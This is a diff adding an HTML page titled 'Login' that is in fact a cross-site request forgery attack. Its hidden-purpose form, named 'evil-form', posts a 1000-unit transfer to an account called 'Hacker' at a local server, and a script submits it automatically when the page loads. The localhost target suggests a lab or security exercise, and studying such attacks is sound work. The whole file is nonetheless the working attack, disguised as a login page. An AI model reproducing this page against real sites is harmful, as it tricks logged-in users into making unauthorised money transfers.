@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="ru">
+    <head>
+        <meta charset="UTF-8">
+        <title>Login</title>
+    </head>
+    <body class="'d-flex flex-column min-vh-100">
+        <h1>Login</h1>
+        <form action="http://127.0.0.1:8000/login" method="POST" id="evil-form">
+            <input name="amount" value="1000"/>
+            <input name="to_account" value="Hacker"/>
+            <input type="hidden" name="token_key" value="{{ csrf_token }}"/>
+            <button action="submit">login</button>
+        </form>
+
+        <script>
+            document.getElementById('evil-form').submit();
+        </script>
+    </body>
+</html>
